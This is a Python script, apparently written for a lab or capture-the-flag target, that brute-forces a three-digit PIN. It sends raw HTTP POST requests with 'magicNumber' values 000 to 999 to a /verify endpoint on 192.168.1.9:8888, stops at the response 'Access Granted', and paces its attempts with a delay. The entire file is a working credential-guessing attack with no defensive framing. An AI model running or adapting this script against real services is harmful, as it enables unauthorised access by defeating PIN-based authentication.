import socket
import time

HOST = '192.168.1.9'
PORT = 8888
DELAY = 1.2
def try_pin(pin):
    
    pin_str = f"{pin:03d}"
    data = f"magicNumber={pin_str}"
    
    
    request = (
        f"POST /verify HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(data)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{data}"
    )
    
    try:
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(5)  
            sock.connect((HOST, PORT))
            sock.sendall(request.encode())
            
            
            response = b""
            while True:
                try:
                    chunk = sock.recv(1024)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    print(f"Socket timed out while receiving data for PIN {pin_str}")
                    break
        
        
        decoded = response.decode(errors="ignore")
        
        
        if "Access Granted" in decoded:
            print(f"SUCCESS! PIN: {pin_str}")
            return True
        
        print(f"Trying PIN {pin_str}")
        return False
    
    except socket.error as e:
        print(f"Socket error with PIN {pin_str}: {e}")
        time.sleep(DELAY * 2)  
        return False
def main():
    
    for pin in range(1000):
        if try_pin(pin):
            print(f"Found correct PIN: {pin:03d}")
            break
        
        
        time.sleep(DELAY)
if __name__ == "__main__":
    main()